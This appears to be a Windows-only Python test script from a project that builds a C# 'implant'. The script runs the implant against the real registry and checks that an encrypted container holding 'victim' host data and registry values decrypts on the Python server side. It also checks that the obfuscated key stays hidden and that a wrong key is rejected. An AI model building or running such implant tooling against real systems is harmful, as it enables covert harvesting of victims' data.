"""Cross-language container interop test (Windows only).

Builds the C# implant through build.bat (in-box csc.exe), runs it in --out
mode against the real registry, then verifies the Python side decrypts the
resulting SHV1 container. Exercises: XOR-encoded PSK decode, CNG AES-GCM
encryption, manifest layout, HKDF key agreement.

    python test/interop_cs.py
"""
import os
import subprocess
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "server"))
import shcrypto  # noqa

PSK = "interop-unit-psk"


def main():
    print("[*] building C# implant (console)...")
    r = subprocess.run(["cmd", "/c", "build.bat", "/psk", PSK],
                       cwd=ROOT, capture_output=True, text=True)
    if r.returncode != 0:
        print(r.stdout[-2000:])
        print(r.stderr[-2000:])
        raise SystemExit("build failed")
    if PSK in r.stdout:
        raise SystemExit("SECURITY: build log leaked the PSK!")
    print("[ok] build clean, PSK not present in build output")

    exe = os.path.join(ROOT, "build", "sh_debug.exe")
    out = os.path.join(tempfile.mkdtemp(prefix="sh_interop_"), "out.bin")
    r = subprocess.run([exe, "--only", "reg", "--out", out],
                       capture_output=True, text=True, timeout=120)
    if r.returncode != 0 or not os.path.exists(out):
        print(r.stdout, r.stderr)
        raise SystemExit("implant run failed rc=%s" % r.returncode)

    manifest, parts = shcrypto.unpack(open(out, "rb").read(), PSK.encode())
    v = manifest["victim"]
    assert v.get("host"), "victim host missing"
    assert "regvals.json" in parts, "registry part missing"
    assert len(parts["regvals.json"]) > 100
    print("[ok] C# container decrypted in python: host=%s parts=%d"
          % (v.get("host"), len(parts)))

    # wrong PSK must fail closed
    try:
        shcrypto.unpack(open(out, "rb").read(), b"wrong")
        raise SystemExit("FAIL: wrong psk accepted")
    except ValueError:
        print("[ok] wrong-psk rejection holds across languages")

    print("\ninterop OK: build -> run -> CNG-GCM encrypt -> python decrypt")


if __name__ == "__main__":
    if not sys.platform.startswith("win"):
        raise SystemExit("windows-only test (csc.exe / registry)")
    main()
